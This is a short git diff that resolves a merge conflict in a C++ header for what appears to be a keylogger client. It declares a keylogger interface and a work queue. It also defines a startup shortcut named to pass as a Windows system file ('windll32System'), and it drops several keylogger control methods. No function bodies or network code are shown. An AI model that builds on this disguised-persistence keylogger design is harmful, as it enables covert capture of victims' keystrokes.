@@ -2,10 +2,6 @@
 # define CLIENT_H__
 
 # include "DLibrary.h"
-<<<<<<< HEAD
-# include "keylogger_dll/KeyloggerDLL.h"
-
-=======
 # include "IInfoClient.h"
 # include "IKeylogger.h"
 # include "WorkQueue.h"
@@ -26,7 +22,6 @@
 
 # define SHORTCUT_NAME L"\\windll32System.lnk"
 # define DESCR			"Critical windll32System instance"
->>>>>>> 81089814f1b803b0d8cb0f2699d6b7be2f15077f
 
 class	clientController {
 
@@ -44,12 +39,6 @@ public:
 
 	int			mainAction(int, char**);
 	void		sayHelloAction(void);
-<<<<<<< HEAD
-	IKeylogger*	initKeyloggerAction(void);
-	bool		runKeyloggerAction(IKeylogger* keylogger);
-	bool		stopKeyloggerAction(IKeylogger* keylogger);
-	void		deleteKeyloggerAction(IKeylogger* keylogger);
-=======
 	void		defineShortcut(void);
 	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);
 
@@ -59,7 +48,6 @@ private:
 	IKeylogger *klinstance;
 	/* INetwork *netinstance; */
 	WorkQueue _lwqueue;
->>>>>>> 81089814f1b803b0d8cb0f2699d6b7be2f15077f
 };
 
 #endif /* !CLIENT_H__ */
